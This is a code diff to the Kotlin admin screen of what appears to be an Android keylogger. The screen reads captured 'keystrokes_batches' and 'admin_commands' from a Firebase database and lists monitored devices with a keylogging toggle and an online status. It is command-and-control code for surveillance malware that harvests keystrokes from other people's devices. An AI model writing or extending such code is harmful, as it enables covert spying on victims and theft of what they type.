@@ -41,9 +41,6 @@ class AdminMainActivity : AppCompatActivity() {
     private lateinit var adapter: DeviceAdapter
     private val DB_URL = "https://key-lo-5811c-default-rtdb.firebaseio.com"
 
-    private var devicesListener: ValueEventListener? = null
-    private var devicesRef: com.google.firebase.database.DatabaseReference? = null
-
     data class DeviceModel(
         val name: String,
         var keylogging: Boolean = true,
@@ -135,13 +132,6 @@ class AdminMainActivity : AppCompatActivity() {
         loadConnectedDevices()
     }
 
-    override fun onDestroy() {
-        super.onDestroy()
-        if (devicesListener != null && devicesRef != null) {
-            devicesRef?.removeEventListener(devicesListener!!)
-        }
-    }
-
     private fun filterDevices(query: String) {
         filteredDeviceList.clear()
         if (query.isBlank()) {
@@ -158,12 +148,8 @@ class AdminMainActivity : AppCompatActivity() {
     }
 
     private fun loadConnectedDevices() {
-        if (devicesListener != null && devicesRef != null) {
-            devicesRef?.removeEventListener(devicesListener!!)
-        }
-
-        devicesRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
-        devicesListener = object : ValueEventListener {
+        val dbRef = FirebaseDatabase.getInstance(DB_URL).getReference("keystrokes_batches")
+        dbRef.addValueEventListener(object : ValueEventListener {
             override fun onDataChange(snapshot: DataSnapshot) {
                 var totalEntriesCount = 0
                 val now = System.currentTimeMillis()
@@ -199,31 +185,44 @@ class AdminMainActivity : AppCompatActivity() {
                     }
                 }
 
-                txtConnectedDevices.text = masterDeviceList.size.toString()
-                txtActivityEvents.text = totalEntriesCount.toString()
-                txtAppsToday.text = masterDeviceList.size.toString()
+                // Dual check: Also check admin_commands so all registered nodes appear strictly on home screen
+                val cmdRootRef = FirebaseDatabase.getInstance(DB_URL).getReference("admin_commands")
+                cmdRootRef.get().addOnSuccessListener { cmdSnapshot ->
+                    for (cmdChild in cmdSnapshot.children) {
+                        val deviceName = cmdChild.key ?: continue
+                        if (masterDeviceList.none { it.name == deviceName }) {
+                            val device = DeviceModel(deviceName)
+                            masterDeviceList.add(device)
+                            listenToDeviceState(deviceName)
+                            listenToDeviceLogs(deviceName)
+                        }
+                    }
 
-                val isOnline = (now - maxLastSeen) < 120000L && maxLastSeen > 0L
-                if (isOnline) {
-                    txtLiveStatusPill.text = "● ONLINE"
-                    txtLiveStatusPill.setTextColor(Color.parseColor("#22C55E"))
-                    txtLiveStatusPill.setBackgroundResource(R.drawable.online_pill_background)
-                    txtActiveNodes.text = "ONLINE"
-                    txtActiveNodes.setTextColor(Color.parseColor("#22C55E"))
-                } else {
-                    txtLiveStatusPill.text = "● OFFLINE"
-                    txtLiveStatusPill.setTextColor(Color.parseColor("#EF4444"))
-                    txtLiveStatusPill.setBackgroundResource(R.drawable.online_pill_background)
-                    txtActiveNodes.text = "OFFLINE"
-                    txtActiveNodes.setTextColor(Color.parseColor("#EF4444"))
+                    txtConnectedDevices.text = masterDeviceList.size.toString()
+                    txtActivityEvents.text = totalEntriesCount.toString()
+                    txtAppsToday.text = masterDeviceList.size.toString()
+
+                    val isOnline = (now - maxLastSeen) < 120000L && maxLastSeen > 0L
+                    if (isOnline) {
+                        txtLiveStatusPill.text = "● ONLINE"
+                        txtLiveStatusPill.setTextColor(Color.parseColor("#22C55E"))
+                        txtLiveStatusPill.setBackgroundResource(R.drawable.online_pill_background)
+                        txtActiveNodes.text = "ONLINE"
+                        txtActiveNodes.setTextColor(Color.parseColor("#22C55E"))
+                    } else {
+                        txtLiveStatusPill.text = "● OFFLINE"
+                        txtLiveStatusPill.setTextColor(Color.parseColor("#EF4444"))
+                        txtLiveStatusPill.setBackgroundResource(R.drawable.online_pill_background)
+                        txtActiveNodes.text = "OFFLINE"
+                        txtActiveNodes.setTextColor(Color.parseColor("#EF4444"))
+                    }
+
+                    filterDevices(etDeviceSearch.text?.toString() ?: "")
                 }
-
-                filterDevices(etDeviceSearch.text?.toString() ?: "")
             }
 
             override fun onCancelled(error: DatabaseError) {}
-        }
-        devicesRef?.addValueEventListener(devicesListener!!)
+        })
     }
 
     private fun parseTimestamp(value: Any?): Long? {
@@ -432,7 +431,7 @@ class AdminMainActivity : AppCompatActivity() {
             for ((appName, count) in sortedApps) {
                 val rowLayout = LinearLayout(context).apply {
                     orientation = LinearLayout.VERTICAL
-                    setPadding(0, 6, 0, 6)
+                    setPadding(0, 4, 0, 4)
                     isClickable = true
                     isFocusable = true
                     setBackgroundColor(Color.parseColor("#161B22"))
